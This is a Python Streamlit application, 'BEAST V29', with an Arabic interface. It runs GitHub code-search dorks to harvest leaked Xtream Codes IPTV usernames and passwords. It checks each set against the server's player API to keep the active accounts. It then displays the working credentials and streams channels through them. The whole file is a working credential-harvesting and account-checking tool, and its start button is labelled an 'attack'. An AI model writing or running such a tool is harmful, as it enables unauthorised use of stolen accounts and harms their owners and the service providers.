import streamlit as st
import requests
import re
import time
import threading
from datetime import datetime

# --- الإعدادات الأساسية ---
st.set_page_config(page_title="BEAST V29 - MILLION HITS", layout="wide")

if "hits" not in st.session_state: st.session_state.hits = []
if "scanning" not in st.session_state: st.session_state.scanning = False
if "auth" not in st.session_state: st.session_state.auth = False

# --- نظام الدخول ---
if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V29 - SUPER SCANNER</h1>", unsafe_allow_html=True)
    with st.container():
        pwd = st.text_input("ادخل كلمة السر:", type="password")
        if st.button("فتح النظام"):
            if pwd == "BEAST_V17_PRO":
                st.session_state.auth = True
                st.rerun()
    st.stop()

# --- التصميم الاحترافي (CSS) ---
st.markdown("""
<style>
    .stApp { background-color: #020202; color: #ffffff; }
    .server-card {
        background: #0d1117; border: 1px solid #30363d; border-radius: 10px;
        padding: 20px; margin-bottom: 15px; border-left: 6px solid #00ff41;
    }
    .channels-list {
        background: #010409; border: 1px dashed #21262d; border-radius: 5px;
        padding: 10px; margin-top: 10px; font-size: 12px; color: #8b949e;
    }
    .badge { background: #238636; color: white; padding: 2px 8px; border-radius: 10px; font-size: 10px; }
    .stButton>button { border-radius: 20px; background: #21262d; color: white; border: 1px solid #30363d; }
    .stButton>button:hover { border-color: #00ff41; color: #00ff41; }
</style>
""", unsafe_allow_html=True)

# --- محرك البحث العملاق ---
def mega_scanner(token):
    st.session_state.scanning = True
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    
    # قائمة دروكات شاملة جداً لزيادة النتائج (أكثر من 50 تركيب بحثي)
    base_dorks = [
        'get.php?username=', 'player_api.php?username=', 'panel_api.php?username=',
        'XC_USER_DATA', 'xtream-codes', '"type=m3u_plus"', '"output=ts"',
        'extension:m3u "http://"', 'extension:txt "password=" "port"'
    ]
    
    unique_links = set([h['host']+h['user'] for h in st.session_state.hits])

    for dork in base_dorks:
        if not st.session_state.scanning: break
        for page in range(1, 10): # سحب أول 10 صفحات من كل دروك
            try:
                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                r = requests.get(search_url, headers=headers).json()
                
                if 'items' not in r:
                    time.sleep(10) # انتظار عند حدوث Rate Limit
                    continue
                
                for item in r['items']:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    try:
                        content = requests.get(raw_url, timeout=3).text
                        # استخراج السيرفرات (Regex مطور)
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        
                        for m in matches:
                            host, user, pw = m[0], m[1], m[2]
                            if host+user not in unique_links:
                                # فحص السيرفر وجلب القنوات فوراً
                                api = f"{host}/player_api.php?username={user}&password={pw}"
                                try:
                                    check = requests.get(api, timeout=3).json()
                                    if check.get("user_info", {}).get("status") == "Active":
                                        # جلب الفئات كعينة للمحتوى
                                        cats = requests.get(f"{api}&action=get_live_categories", timeout=3).json()
                                        cat_names = [c['category_name'] for c in cats[:10]] if isinstance(cats, list) else ["No Categories found"]
                                        
                                        st.session_state.hits.append({
                                            "host": host, "user": user, "pw": pw,
                                            "info": check["user_info"],
                                            "cats": cat_names
                                        })
                                        unique_links.add(host+user)
                                except: continue
                    except: continue
            except: continue
    st.session_state.scanning = False

# --- الواجهة الرئيسية ---
st.title("📡 BEAST V29 - الرادار المليوني")

with st.sidebar:
    st.header("⚙️ لوحة التحكم")
    gh_token = st.text_input("GitHub Token (Classic):", type="password")
    if st.button("🚀 بدء الهجوم الشامل"):
        if gh_token:
            threading.Thread(target=mega_scanner, args=(gh_token,), daemon=True).start()
            st.success("بدأ الفحص الخلفي... النتائج ستظهر فوراً!")
        else: st.error("أدخل التوكن أولاً!")
    
    if st.button("🛑 إيقاف البحث"):
        st.session_state.scanning = False
        st.rerun()

    st.divider()
    st.write(f"📊 النتائج المكتشفة: **{len(st.session_state.hits)}**")

# --- عرض النتائج ---
if not st.session_state.hits:
    st.info("لم يتم العثور على نتائج بعد. تأكد من إدخال التوكن والضغط على بدء الهجوم.")
else:
    for idx, srv in enumerate(reversed(st.session_state.hits)):
        with st.container():
            st.markdown(f"""
            <div class="server-card">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <span style="font-size:18px; color:#00ff41; font-weight:bold;">✅ HIT #{len(st.session_state.hits)-idx}</span>
                    <span class="badge">ACTIVE</span>
                </div>
                <p style="margin:5px 0;"><b>HOST:</b> {srv['host']}</p>
                <p style="margin:5px 0; color:#fbbf24;"><b>USER:</b> {srv['user']} | <b>PASS:</b> {srv['pw']}</p>
                <div class="channels-list">
                    <b>📁 عينة من باقات السيرفر:</b><br>
                    {' | '.join(srv['cats'])} ...
                </div>
            </div>
            """, unsafe_allow_html=True)
            
            # زر الدخول للمشغل لكل سيرفر
            if st.button(f"📺 فتح مشغل Xtream لهذا السيرفر (#{len(st.session_state.hits)-idx})", key=f"play_{idx}"):
                st.session_state.active_srv = srv
                st.session_state.show_player = True

# --- واجهة المشغل (تظهر كـ Popup أو صفحة إضافية) ---
if "show_player" in st.session_state and st.session_state.show_player:
    st.divider()
    srv = st.session_state.active_srv
    st.header(f"🎬 مشغل BEAST لـ: {srv['host']}")
    if st.button("❌ إغلاق المشغل"):
        st.session_state.show_player = False
        st.rerun()
    
    # هنا يتم استدعاء قوائم القنوات كاملة
    api_base = f"{srv['host']}/player_api.php?username={srv['user']}&password={srv['pw']}"
    
    col_l, col_r = st.columns([1, 2])
    with col_l:
        st.subheader("📋 القنوات")
        streams = requests.get(f"{api_base}&action=get_live_streams", timeout=5).json()
        if isinstance(streams, list):
            search = st.text_input("بحث سريع..")
            for s in streams[:100]: # عرض أول 100 قناة للسرعة
                if search.lower() in s['name'].lower():
                    if st.button(f"▶️ {s['name']}", key=f"stream_{s['stream_id']}"):
                        st.session_state.url = f"{srv['host']}/live/{srv['user']}/{srv['pw']}/{s['stream_id']}.m3u8"
        else: st.error("لا يمكن تحميل القنوات.")

    with col_r:
        if "url" in st.session_state:
            st.video(st.session_state.url)
            st.code(st.session_state.url)
        else:
            st.info("اختر قناة للبدء.")
